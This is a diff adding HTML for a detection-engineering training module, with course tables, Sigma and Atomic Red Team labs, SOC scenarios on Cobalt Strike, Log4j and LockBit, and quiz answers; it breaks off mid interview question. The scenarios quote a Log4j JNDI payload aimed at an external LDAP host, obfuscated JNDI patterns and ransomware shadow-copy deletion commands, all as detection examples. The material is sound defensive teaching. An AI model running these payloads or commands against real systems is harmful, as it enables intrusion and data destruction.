+<tr><td>Detection Engineering</td><td>Hard</td><td>Full detection engineering lifecycle — research, write, test, deploy, and tune Sigma rules for real APT techniques</td><td>5</td></tr>
+<tr><td>Red Team Tactics — Detecting Techniques</td><td>Medium</td><td>Learn to detect specific red team techniques — process injection, DCSync, token theft, etc.</td><td>6</td></tr>
+<tr><td>Threat Hunting</td><td>Medium</td><td>Proactive threat hunting methodology — hypothesis generation, data collection, analysis, documentation</td><td>7</td></tr>
+<tr><td>Threat Hunting: Sysmon</td><td>Hard</td><td>Use Sysmon logs to hunt for advanced threats — process hollowing, reflective DLL loading, named pipe detections</td><td>8</td></tr>
+<tr><td>Purple Teaming with Atomic Red Team</td><td>Medium</td><td>Execute ART tests, validate detection coverage, measure detect rate, improve rules</td><td>9</td></tr>
+<tr><td>Windows Detection Engineering</td><td>Hard</td><td>Advanced detection techniques for Windows — ETW providers, kernel callbacks, AMSI bypass detection</td><td>10</td></tr>
+</table>
+</div>
+
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-shield-shaded me-2"></i>6. HACK THE BOX ACADEMY SECTION</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Module</th><th style="color:#00d4ff;text-align:left;">Difficulty</th><th style="color:#00d4ff;text-align:left;">Learning Outcomes</th></tr>
+<tr><td>Detection Engineering Fundamentals</td><td>Easy</td><td>Master detection types, Sigma syntax, YARA basics, rule testing methodology</td></tr>
+<tr><td>Windows Event Logs for Detection</td><td>Medium</td><td>Deep knowledge of Windows Event Log IDs for detection — which IDs map to which ATT&CK techniques</td></tr>
+<tr><td>Sysmon for Detection Engineering</td><td>Medium</td><td>All Sysmon event IDs and how to use them for detection — process tree, network connections, file/registry changes</td></tr>
+<tr><td>Sigma Rules for Detection</td><td>Medium</td><td>Write production-quality Sigma rules for 20+ ATT&CK techniques, convert to multiple SIEM formats</td></tr>
+<tr><td>YARA Rules for Malware Detection</td><td>Hard</td><td>Write YARA rules for real malware families — identify unique byte patterns, strings, and behavioral characteristics</td></tr>
+<tr><td>Behavioral Detection & Anomaly Detection</td><td>Hard</td><td>Implement behavioral baselines, statistical anomaly detection, ML-driven detection in SIEM environment</td></tr>
+<tr><td>Purple Team Operations</td><td>Hard</td><td>Run full purple team exercises: plan, simulate, detect, measure, improve. Use Atomic Red Team and Caldera</td></tr>
+<tr><td>Threat Intelligence Integration</td><td>Medium</td><td>Operationalize CTI — integrate MISP, OpenCTI, threat intel feeds, automated enrichment</td></tr>
+</table>
+</div>
+
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-shield-check me-2"></i>7. LETSDEFEND SECTION</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Investigation/Scenario</th><th style="color:#00d4ff;text-align:left;">Type</th><th style="color:#00d4ff;text-align:left;">Description</th></tr>
+<tr><td>SOC169 — Malware Analysis With Detection Rules</td><td>SOC Simulation</td><td>Analyze a malware sample, identify key behavioral indicators, write Sigma and YARA rules to detect the malware family</td></tr>
+<tr><td>SOC143 — Phishing Detection With Sigma</td><td>SOC Simulation</td><td>Write Sigma rules to detect phishing-related behaviors — Office spawning PowerShell, macro execution patterns</td></tr>
+<tr><td>SOC185 — SOC Simulation With Detection Engineering</td><td>SOC Simulation</td><td>Full simulation: receive threat intel report, research technique, write rule, test with ART, deploy, validate</td></tr>
+<tr><td>SOC190 — Purple Team Exercise</td><td>SOC Simulation</td><td>Execute purple team exercise: red team runs Atomic tests, blue team evaluates detection, identifies gaps, improves rules</td></tr>
+<tr><td>SOC158 — Detection Rule Tuning</td><td>Alert Triage</td><td>Review 7 days of alerts from 5 detection rules, identify FP patterns, tune each rule, measure FP reduction</td></tr>
+<tr><td>SOC172 — Threat Hunting With Zeek Logs</td><td>SOC Simulation</td><td>Use Zeek (Bro) logs to hunt for C2 beaconing, DNS tunneling, and data exfiltration patterns</td></tr>
+<tr><td>SOC173 — Threat Hunting With EDR Logs</td><td>SOC Simulation</td><td>Use EDR telemetry to hunt for process injection, persistence mechanisms, and credential access techniques</td></tr>
+</table>
+</div>
+
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-shield-fill me-2"></i>8. CYBERDEFENDERS SECTION</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Challenge</th><th style="color:#00d4ff;text-align:left;">Difficulty</th><th style="color:#00d4ff;text-align:left;">Description</th></tr>
+<tr><td>Sigma Rule Challenge — Ransomware</td><td>Easy</td><td>Write Sigma rules to detect ransomware behaviors: shadow copy deletion, mass file renames, ransom note creation</td></tr>
+<tr><td>Coverage Heatmap Challenge</td><td>Medium</td><td>Build a MITRE ATT&CK coverage heatmap for your SIEM — identify top 10 techniques with no coverage, write rules to close gaps</td></tr>
+<tr><td>Atomic Red Team Validation</td><td>Medium</td><td>Run all Atomic Red Team tests for "Execution" tactic, document which tests triggered alerts, identify detection gaps</td></tr>
+<tr><td>Custom YARA Rule Challenge</td><td>Hard</td><td>Analyze 3 advanced malware samples, write YARA rules that detect each family without false positives on legitimate software</td></tr>
+<tr><td>Full Purple Team Exercise</td><td>Hard</td><td>Design and execute a purple team exercise covering 15 ATT&CK techniques — simulate, detect, measure, improve, document</td></tr>
+</table>
+</div>
+
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-github me-2"></i>9. GITHUB RESOURCES</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Repository</th><th style="color:#00d4ff;text-align:left;">Purpose</th><th style="color:#00d4ff;text-align:left;">Skills Learned</th></tr>
+<tr><td><a href="https://github.com/keraattin/Blue-Team-Roadmap" style="color:#00d4ff;" target="_blank">Blue-Team-Roadmap</a></td><td>Structured learning path for blue team and detection engineering</td><td>Detection skill progression, career development, technique mastery</td></tr>
+<tr><td><a href="https://github.com/cyb3rxp/awesome-soc" style="color:#00d4ff;" target="_blank">awesome-soc</a></td><td>Curated SOC resources including detection tools and rule repositories</td><td>Tool discovery, detection framework knowledge, industry best practices</td></tr>
+<tr><td><a href="https://github.com/SigmaHQ/sigma" style="color:#00d4ff;" target="_blank">sigma</a></td><td>The official Sigma rule repository — 2,000+ detection rules for all common attack techniques</td><td>Sigma rule writing, detection logic patterns, rule conversion to SIEM platforms</td></tr>
+<tr><td><a href="https://github.com/redcanaryco/atomic-red-team" style="color:#00d4ff;" target="_blank">atomic-red-team</a></td><td>Executable tests for MITRE ATT&CK techniques — validate your detection coverage</td><td>Purple team methodology, detection validation, attack simulation</td></tr>
+<tr><td><a href="https://github.com/SwiftOnSecurity/sysmon-config" style="color:#00d4ff;" target="_blank">sysmon-config</a></td><td>Gold-standard Sysmon configuration for Windows detection capabilities</td><td>Detection data source configuration, Windows event telemetry optimization</td></tr>
+<tr><td><a href="https://github.com/aboutsecurity/blueteam_homelabs" style="color:#00d4ff;" target="_blank">blueteam_homelabs</a></td><td>Home lab setups for practicing detection engineering in realistic environments</td><td>Lab architecture, detection rule deployment, hands-on engineering</td></tr>
+<tr><td><a href="https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES" style="color:#00d4ff;" target="_blank">EVTX-ATTACK-SAMPLES</a></td><td>Real Windows event logs from real attacks — perfect for testing detection rules</td><td>Event log analysis, rule testing with real data, attack pattern recognition</td></tr>
+<tr><td><a href="https://github.com/InQuest/awesome-yara" style="color:#00d4ff;" target="_blank">awesome-yara</a></td><td>Comprehensive YARA resource list for file and memory threat detection</td><td>YARA rule writing, malware detection, memory forensics signatures</td></tr>
+<tr><td><a href="https://github.com/A-poc/BlueTeam-Tools" style="color:#00d4ff;" target="_blank">BlueTeam-Tools</a></td><td>Blue team tools including detection-focused tools and rule generators</td><td>Tool proficiency, detection toolchain, automated rule creation</td></tr>
+</table>
+</div>
+
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-laptop me-2"></i>10. HANDS-ON LABS</h6>
+
+<p style="color:#00d4ff;font-weight:600;">Beginner Lab: Sigma Rule Writing and Conversion</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Write 5 Sigma detection rules for common attack techniques, convert them to Splunk/Elastic format, and test them against sample EVTX files.<br><br>
+<b>Setup:</b> Python with sigma-cli installed (<code>pip install sigma-cli</code>). Download sample EVTX files from sbousseaden's EVTX-ATTACK-SAMPLES repo. Have a text editor ready.<br><br>
+<b>Step-by-Step:</b><br>
+1. Write a Sigma rule to detect RunDLL32 executing JavaScript:<br>
+<code>title: RunDLL32.exe Executes JavaScript<br>
+logsource: category: process_creation, product: windows<br>
+detection: selection: Image|endswith: '\rundll32.exe', CommandLine|contains: 'javascript:'<br>
+condition: selection<br>
+level: high</code><br>
+2. Write a Sigma rule to detect certutil downloading files:<br>
+<code>title: Certutil URL Download<br>
+logsource: category: process_creation, product: windows<br>
+detection: selection: Image|endswith: '\certutil.exe', CommandLine|contains: '-urlcache'<br>
+condition: selection<br>
+level: medium</code><br>
+3. Convert Sigma to Splunk: <code>sigma convert -t splunk -p default rule.yml</code><br>
+4. Convert Sigma to Elastic: <code>sigma convert -t elasticsearch -p default rule.yml</code><br>
+5. Test against EVTX sample: Load the EVTX file in Splunk or Elastic, run the converted query, verify results<br>
+6. Create rules for: (3) WMI persistence, (4) PowerShell encoded command, (5) Scheduled task creation by non-admin<br><br>
+<b>Expected Results:</b> You can write, convert, and test Sigma rules. You understand the syntax, logsource categories, detection conditions, and field modifiers (|endswith, |contains, |startswith).<br><br>
+<b>Troubleshooting:</b> Conversion fails? Check Python version and sigma version. Field names differ between SIEMs — check the Sigma documentation for field mapping.<br><br>
+<b>Detection Opportunities:</b> Write rules for techniques you encounter in your daily work. Test them against real SIEM data (with proper authorization).
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Intermediate Lab: Purple Team Exercise with Atomic Red Team</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Execute a complete purple team exercise covering 10 MITRE ATT&CK techniques, measure detection coverage, identify gaps, and improve detection rules.<br><br>
+<b>Setup:</b> Windows VM with: Atomic Red Team installed (<code>Install-AtomicRedTeam -getAtomics</code>), Sysmon with SwiftOnSecurity config, Windows Event Log forwarding to SIEM (Splunk/Wazuh/Elastic).<br><br>
+<b>Step-by-Step:</b><br>
+1. Select 10 ATT&CK techniques to test (e.g., T1059.001, T1003.001, T1021.001, T1055.001, T1053.005, T1047, T1547.001, T1036, T1204.002, T1486)<br>
+2. Before running tests, check if you have detection rules for each technique — create coverage spreadsheet<br>
+3. Run each Atomic test:<br>
+<code>Invoke-AtomicTest T1059.001 -TestNumbers 1,2,3<br>
+Invoke-AtomicTest T1003.001 -TestNumbers 1<br>
+Invoke-AtomicTest T1021.001 -TestNumbers 1</code><br>
+4. For each test, check: Did the SIEM generate an alert? Which rule fired? Was the alert severity appropriate? Was enough context captured?<br>
+5. For tests that did NOT trigger alerts, investigate: Missing log source? Rule not deployed? Rule logic wrong?<br>
+6. Fix gaps: Write new Sigma rules, deploy, reconfigure log sources<br>
+7. Re-run the failed tests — confirm detection now works<br>
+8. Update coverage heatmap and document findings<br><br>
+<b>Expected Results:</b> Coverage heatmap showing which techniques were detected (by rules) vs missed. Before/after comparison showing improvement. Documentation of each gap and fix.<br><br>
+<b>Troubleshooting:</b> Test didn't generate expected logs? Run with admin privileges. Check Sysmon is running. Check if Windows Defender ate the test file — add exclusion for C:\AtomicRedTeam.<br><br>
+<b>Detection Opportunities:</b> Standardize this as a monthly process. Run the full exercise once per quarter and track coverage improvement over time.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Advanced Lab: Building a Detection Pipeline with Automated Validation</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Build a complete detection pipeline: Sigma rule repository → CI/CD conversion → SIEM deployment → Automated Atomic Red Team testing → Coverage dashboard → Improvement loop.<br><br>
+<b>Setup:</b> GitHub repo for Sigma rules, GitHub Actions for CI/CD, Elastic SIEM or Splunk, Atomic Red Team on Windows VM, Python script for automated testing.<br><br>
+<b>Step-by-Step:</b><br>
+1. Create GitHub repo with folder structure: <code>rules/sigma/, rules/yara/, tests/, coverage/</code><br>
+2. Write GitHub Actions workflow: on push to main → sigma convert all rules to Elastic format → deploy to Elastic via API → run Atomic tests → update coverage.json → generate coverage badge<br>
+3. Write a Python script that:<br>
+   a. Receives list of new/changed rules<br>
+   b. Runs corresponding Atomic Red Team tests for each technique<br>
+   c. Checks SIEM API for corresponding alerts<br>
+   d. Returns pass/fail for each rule<br>
+   e. Updates coverage.json with test results<br>
+4. Build coverage dashboard in Grafana/Elastic showing:<br>
+   - % techniques covered by technique by tactic by platform<br>
+   - Trend: coverage over time (daily/weekly/monthly)<br>
+   - Rules by status (stable/test/experimental)<br>
+   - Top 10 techniques without coverage<br>
+5. Implement detection engineering review process: quarterly review of coverage gaps, assign rules to engineers, track SLA for new rule creation<br>
+6. Add automated PR checks: when an engineer submits a new Sigma rule, CI/CD validates syntax, runs tests, checks for false positive potential, provides coverage score<br><br>
+<b>Expected Results:</b> Fully automated detection pipeline with continuous validation. Every rule is tested before deployment. Coverage is tracked and improving. Dashboard shows real-time detection posture.<br><br>
+<b>Troubleshooting:</b> API integration fails? Check authentication, API keys, rate limits. Elastic SIEM API uses API keys; Splunk uses tokens. Tests take too long? Run in parallel, prioritize critical techniques.<br><br>
+<b>Detection Opportunities:</b> Expand to include not just Atomic Red Team but also real malware samples in a sandbox for YARA rule validation. Add tru' + 'e positive feedback from SOC analysts back into the pipeline to track which rules actually detect real incidents vs only test-generated ones.
+</div>
+
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-people me-2"></i>11. SOC SCENARIOS</h6>
+
+<p style="color:#00d4ff;font-weight:600;">Scenario 1: Cobalt Strike C2 Detection via Process Injection</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>What Happened:</b> EDR generates an alert on a finance workstation: "Process injection detected — unknown DLL injected into svchost.exe." The injected process then makes outbound HTTPS connections to 45.33.32.156:443. This matches Cobalt Strike C2 behavior — beaconing to an external IP via HTTPS, using a legitimate system process as a host.<br><br>
+<b>How to Detect:</b> Sysmon Event ID 8 (CreateRemoteThread) — detects one process creating a thread in another process. Sysmon Event ID 7 (ImageLoad) — detects a DLL loaded into a process from an abnormal location (e.g., DLL loaded into svchost.exe from %TEMP%). Correlation: process injection (EID 8) followed by network connection (EID 3) from the injected process to external IP = high-fidelity Cobalt Strike indicator.<br><br>
+<b>Sigma Rule:</b><br>
+<code>title: Cobalt Strike — Process Injection into svchost.exe<br>
+logsource: product: windows, category: create_remote_thread<br>
+detection: selection: TargetImage|endswith: '\svchost.exe', SourceImage|endswith: '\svchost.exe'<br>
+condition: selection<br>
+falsepositives: Legitimate antivirus injections, Microsoft update processes<br>
+level: critical</code><br><br>
+<b>How to Investigate:</b> Identify the source process that performed the injection — what process injected the DLL? Check its parent chain — is it Office/PDF/email-related? Extract the injected DLL from svchost.exe's memory for analysis. Check the C2 IP (45.33.32.156) — is it on any threat intel blocklists? Check JA3 hash of the TLS connection — Cobalt Strike has distinctive JA3 fingerprints. Check what other hosts communicated with the same IP — is this isolated or widespread?<br><br>
+<b>How to Respond:</b><br>
+1. Immediately isolate the affected workstation<br>
+2. Block C2 IP and any associated domains at firewall and proxy<br>
+3. Capture memory image before remediation (Cobalt Strike injects into memory, not disk)<br>
+4. Check for lateral movement — Cobalt Strike can spread to other hosts via SMB or WMI<br>
+5. Check if any data was exfiltrated via the C2 channel<br>
+6. Search all hosts for connections to the same C2 IP — use DNS and proxy logs<br>
+7. Reimage the affected host from clean backup<br><br>
+<b>How to Document:</b> Incident report with: injection technique, C2 infrastructure, JA3 fingerprint, timeframe, data exfiltrated assessment, affected hosts, remediation steps. Update detection rules based on findings.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Scenario 2: Log4j (CVE-2021-44228) Exploitation Attempt</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>What Happened:</b> WAF alerts on an HTTP request containing the string <code>${jndi:ldap://45.33.32.156:1389/a}</code> in the User-Agent header. This is a Log4j exploitation attempt — the attacker is trying to trigger a JNDI lookup to an attacker-controlled LDAP server that will serve a malicious Java class.<br><br>
+<b>How to Detect:</b> WAF rules detecting JNDI lookup patterns in any HTTP header, parameter, or body. Multiple detection patterns: <code>${jndi:ldap://</code>, <code>${jndi:rmi://</code>, <code>${jndi:dns://</code>, <code>${${::-j}ndi:</code> (bypass attempts using lowercase/uppercase tricks). Also detect outbound LDAP connections to non-standard ports (1389, 389) from web servers.<br><br>
+<b>SIEM Detection Query:</b><br>
+<code>index=proxy OR index=waf<br>
+| search "*\${jndi:*" OR "*jndi:ldap*" OR "*jndi:rmi*" OR "*jndi:dns*"<br>
+| stats count by src_ip, dest_ip, uri, http_user_agent<br>
+| where count > 1<br>
+| table src_ip, dest_ip, uri, http_user_agent, count</code><br><br>
+<b>How to Investigate:</b> Check if the Log4j version on the target server is vulnerable. Check if the JNDI lookup succeeded (check DNS logs for outbound queries to attacker domain). Check for file creation after the exploit attempt (web shell, backdoor). Check the attacker's LDAP server IP — what else is hosted there? Check if the attacker attempted other techniques (lateral movement, data access).<br><br>
+<b>How to Respond:</b><br>
+1. If exploitation is confirmed: isolate the affected server immediately<br>
+2. Block the attacker IP and LDAP server IP at firewall<br>
+3. Apply Log4j patch (upgrade to 2.17.0+) or implement mitigation (set log4j2.formatMsgNoLookups=true)<br>
+4. Scan all servers for vulnerable Log4j versions<br>
+5. Check for post-exploitation activities (web shells, new accounts, unusual processes)<br>
+6. Implement WAF rules blocking JNDI patterns across all web applications<br><br>
+<b>How to Document:</b> Vulnerability exploitation incident. Note: CVE-2021-44228, affected systems, patch status, detection and blocking timeline, scope assessment, IoCs.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Scenario 3: Ransomware — LockBit 3.0 Detection and Response</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>What Happened:</b> EDR alerts: "Mass file encryption detected on SERVER23." Sysmon Event ID 11 shows thousands of file creations with .lockbit extension within 30 seconds. Event ID 1 shows vssadmin.exe executed with "delete shadows /all /quiet." Event ID 4688 shows bcdedit.exe executed with "/set {default} recoveryenabled no." This is the LockBit 3.0 ransomware pattern: encrypt files, delete backups, disable recovery.<br><br>
+<b>How to Detect:</b> Behavioral detection rules capturing the ransomware sequence pattern. Key Sigma rule: shadow copy deletion + file encryption + recovery disable in &lt; 60 seconds on same host. File extension monitoring for known ransomware extensions (.lockbit, .encrypted, .enc, .crypted). Process chain detection: parent process (cmd.exe or explorer.exe) spawning vssadmin.exe = highly suspicious.<br><br>
+<b>Sigma Rule for Ransomware Detection:</b><br>
+<code>title: LockBit 3.0 — Shadow Copy Deletion<br>
+logsource: product: windows, category: process_creation<br>
+detection: selection: Image|endswith: '\vssadmin.exe', CommandLine|contains|all: 'delete', 'shadows'<br>
+condition: selection<br>
+level: critical</code><br><br>
+<b>How to Investigate:</b> Find patient zero — which host was compromised first? The ransomware likely spread from another host via SMB/WMI. Check domain controller logs for lateral movement. Determine initial access vector — check email for phishing, check RDP logs for external connections, check vulnerability scans for unpatched services. Check if there's a ransom note — what Bitcoin address is used? Check if data was exfiltrated before encryption (LockBit often steals data before encrypting — "double extortion").<br><br>
+<b>How to Respond:</b><br>
+1. Isolate SERVER23 and all hosts showing encryption activity<br>
+2. Block SMB (port 445) at all switches/firewalls to prevent spread<br>
+3. Shut down all mapped drives immediately<br>
+4. Check offline/immutable backup — if available, validate backup integrity<br>
+5. Do NOT pay ransom — only 54% of victims get data back, and paying funds criminal operations<br>
+6. Report to law enforcement (FBI IC3, CISA)<br>
+7. Wait for decryption tools — law enforcement sometimes obtains decryption keys<br>
+8. Begin forensic investigation: capture memory and disk before reimage<br><br>
+<b>How to Document:</b> Major incident report with: ransomware family (LockBit 3.0), encryption scope (files/hosts), backup status, ransom note, Bitcoin wallet address, timeline, containment actions, recovery actions, lessons learned. Recommend: implement offline backups, enable EDR blocking for ransomware behaviors, restrict vssadmin.exe and bcdedit.exe execution via AppLocker.
+</div>
+
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-question-circle me-2"></i>12. KNOWLEDGE CHECK</h6>
+
+<p style="color:#00d4ff;font-weight:600;">Multiple Choice Questions</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>1. What does the Sigma rule field <code>Image|endswith: '\powershell.exe'</code> mean?</b><br>
+a) The Image field must exactly equal powershell.exe<br>
+b) The Image field must end with \powershell.exe<br>
+c) The Image field must not end with \powershell.exe<br>
+d) The Image field contains powershell.exe anywhere<br>
+<strong style="color:#00d4ff;">Answer: b) The Image field must end with \powershell.exe</strong><br><br>
+
+<b>2. Which Sysmon Event ID detects process injection via CreateRemoteThread?</b><br>
+a) Event ID 1<br>
+b) Event ID 3<br>
+c) Event ID 8<br>
+d) Event ID 13<br>
+<strong style="color:#00d4ff;">Answer: c) Event ID 8</strong><br><br>
+
+<b>3. What is the primary advantage of behavioral detection over signature-based detection?</b><br>
+a) Lower false positive rate<br>
+b) Detects unknown malware and zero-days<br>
+c) Easier to implement<br>
+d) No maintenance required<br>
+<strong style="color:#00d4ff;">Answer: b) Detects unknown malware and zero-days</strong><br><br>
+
+<b>4. Which tool is used to validate detection coverage by executing real adversary techniques?</b><br>
+a) Sigma CLI<br>
+b) YARA<br>
+c) Atomic Red Team<br>
+d) VSCode<br>
+<strong style="color:#00d4ff;">Answer: c) Atomic Red Team</strong><br><br>
+
+<b>5. A Sigma rule with <code>status: experimental</code> means:</b><br>
+a) The rule is proven and deployed in production<br>
+b) The rule is being tested and may have high false positive rate<br>
+c) The rule has been deprecated<br>
+d) The rule only runs in test environment<br>
+<strong style="color:#00d4ff;">Answer: b) The rule is being tested and may have high false positive rate</strong><br><br>
+
+<b>6. In the detection engineering lifecycle, what comes after deployment?</b><br>
+a) Research<br>
+b) Maintenance<br>
+c) Testing validation<br>
+d) Tuning<br>
+<strong style="color:#00d4ff;">Answer: b) Maintenance</strong><br><br>
+
+<b>7. What does LOLBin stand for?</b><br>
+a) Living Off the Land Binary<br>
+b) Lost On Location Binary<br>
+c) Logged On Binary<br>
+d) Local Object Library Binary<br>
+<strong style="color:#00d4ff;">Answer: a) Living Off the Land Binary</strong><br><br>
+
+<b>8. Which field in Sigma maps a rule to a specific adversarial technique?</b><br>
+a) title<br>
+b) description<br>
+c) tags<br>
+d) logsource<br>
+<strong style="color:#00d4ff;">Answer: c) tags</strong><br><br>
+
+<b>9. A process tree shows: WINWORD.EXE → cmd.exe → powershell.exe. This is most likely:</b><br>
+a) Normal document editing behavior<br>
+b) A phishing attack with macro-enabled document<br>
+c) System update process<br>
+d) Anti-virus scanning<br>
+<strong style="color:#00d4ff;">Answer: b) A phishing attack with macro-enabled document</strong><br><br>
+
+<b>10. What is the recommended maximum False Positive rate for production detection rules?</b><br>
+a) 0% — zero false positives<br>
+b) 10-15%<br>
+c) 30-40%<br>
+d) 50-60%<br>
+<strong style="color:#00d4ff;">Answer: b) 10-15% (some sources say up to 30% is acceptable for high-severity rules, but 10-15% is the target for most rules)</strong>
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Practical Questions</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>1.</b> Write a Sigma rule that detects certutil.exe being used to download a file from a remote URL (hint: certutil has -urlcache and -split parameters).<br>
+<strong style="color:#00d4ff;">Answer: <code>title: Certutil Download<br>
+logsource: category: process_creation, product: windows<br>
+detection: selection: Image|endswith: '\certutil.exe', CommandLine|contains: '-urlcache'<br>
+condition: selection<br>
+level: medium</code></strong><br><br>
+
+<b>2.</b> You need to detect an attacker running Mimikatz to dump credentials from LSASS. Which Sysmon Event ID would be most useful and what field would you check?<br>
+<strong style="color:#00d4ff;">Answer: Sysmon Event ID 10 (ProcessAccess) — detects when a process opens a handle to another process. The key field is TargetImage with value containing lsass.exe. Also check the SourceImage — if it's not a known legitimate process accessing LSASS (like svchost.exe or a Microsoft security tool), it's suspicious. Windows Event ID 4654 (A handle to an object was requested) on LSASS is also useful. Combined with Event ID 4688 showing mimikatz.exe execution, this is high confidence.</strong><br><br>
+
+<b>3.</b> Your SIEM has 5,000 alerts per day from a rule titled "Suspicious PowerShell." Analysts report 90% are false positives from IT automation scripts. Describe your tuning process.<br>
+<strong style="color:#00d4ff;">Answer: (1) Analyze 100 FP alerts — identify common patterns (specific IT tool names, specific users, specific arguments like -NoProfile, specific parent processes), (2) Add exceptions to the rule: exclude processes with parent process matching IT automation tools, exclude specific user accounts, exclude arguments matching known safe script names, (3) Implement allowlist of known safe PowerShell scripts by hash, (4) Adjust severity from medium to low for generic PowerShell alerts and create specific rules for high-risk patterns (PowerShell with -EncodedCommand, PowerShell downloading from URL, PowerShell accessing LSASS), (5) After changes, monitor FP rate for 1 week — target reduction from 90% to 50%, then iterate. (6) Implement a feedback mechanism where L1 analysts can mark FPs and automatically add to exception list.</strong><br><br>
+
+<b>4.</b> You need to validate that your detection rules cover the technique "T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys." Write a step-by-step testing plan.<br>
+<strong style="color:#00d4ff;">Answer: (1) Verify log source: confirm Sysmon Event ID 13 (RegistryEvent) is being collected for HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry key, (2) Check if existing rule exists for registry Run key modifications — write Sigma rule if not, (3) Execute Atomic Red Team test T1547.001: <code>Invoke-AtomicTest T1547.001 -TestNumbers 1</code>, (4) Verify alert generated in SIEM — check that the alert shows: registry key path, value name, image path, timestamp, (5) Test false negative: run the test again with different registry value names, (6) Test false positive: create a legitimate registry Run key entry (e.g., install a legit app), (7) If rule missed the test, investigate: was Sysmon EID 13 captured? Was rule deployed? Was rule logic correct? (8) Fix any gaps and re-test, (9) Document test results and update coverage heatmap.</strong><br><br>
+
+<b>5.</b> Explain how you would detect DNS tunneling data exfiltration using only DNS logs.<br>
+<strong style="color:#00d4ff;">Answer: DNS tunneling encodes data in subdomain labels and sends it via DNS queries. Detection methods: (1) High query volume — a single host making 10,000+ DNS queries per hour to the same domain, (2) Long subdomain labels — legitimate subdomains average 10-20 characters; DNS tunneling uses 40+ characters per label, (3) Unusual record types — TXT records are most common for tunneling (data can be 255 bytes per record), (4) Entropy analysis — DNS tunneling subdomains have high entropy (random character distribution) compared to legitimate subdomains, (5) Domain age — tunneling domains are often newly registered (&lt; 30 days), (6) Query frequency — DNS tunneling often uses specific intervals (every 1-5 seconds) without breaks, (7) Low TTL — tunneling domains often set low TTL (60-300 seconds) to facilitate rapid configuration changes. KQL query: <code>DnsEvents | where SubdomainLength > 40 | where QueryCount > 1000 per hour | sort by EntropyScore desc</code></strong>
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Investigation Scenarios</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Scenario A — Rule that Never Fires:</b> You discover that one of your critical detection rules ("Suspicious Service Installation — Remote") has never generated an alert in 6 months. This rule is supposed to detect attackers installing services remotely. Should you be concerned?<br>
+<strong style="color:#00d4ff;">Answer: Yes, this is extremely concerning. Either (1) no attacker has used this technique against you (unlikely in 6 months if you have any exposure), or (2) the rule doesn't work. Investigate: (a) Check the log source the rule depends on — is the Windows Event Log for service creation (Event ID 7045, 4697) being forwarded to SIEM? (b) Test the rule manually — run <code>Invoke-AtomicTest T1543.003</code> (Create or Modify System Process: Windows Service) — does the alert fire? (c) Check if the rule was accidentally disabled, (d) Check if the log source stopped sending data months ago, (e) Check if the rule logic has an error — maybe the field name changed after an SIEM update. After fixing, always test with Atomic Red Team before declaring the rule operational.</strong><br><br>
+
+<b>Scenario B — Alert Overwhelm:</b> A new detection rule was deployed 2 weeks ago. It generated 12,000 alerts in the first week and 15,000 in the second week. Analysts classified 200 of those alerts — only 3 were true positives. The remaining 26,800 alerts were never investigated because analysts stopped looking at them. What do you do?<br>
+<strong style="color:#00d4ff;">Answer: This is a critical noise problem. (1) Immediately disable the rule — it's doing more harm than good by creating alert fatigue, (2) Analyze the 200 classified alerts — find the FP pattern. Likely causes: rule is too broad (matches too much normal behavior), missing exception list, threshold too low, (3) Redesign the rule: add more specific conditions (e.g., instead of "any PowerShell", require "PowerShell WITH -EncodedCommand AND parent process is Office application"), (4) Add exception list for known safe sources (specific IT teams, automation tools, patch management systems), (5) Re-deploy in monitor-only mode for 1 week — review all generated alerts, (6) Only enable alerting when FP rate drops below 20%, (7) In the future: always deploy new rules in monitor-only for 2 weeks before enabling alerting. Use a staging process: monitor-only → low severity → medium severity → high severity as confidence grows.</strong>
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Interview Questions</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>1. "How would you detect process hollowing, and what log events would you look for?"</b><br>
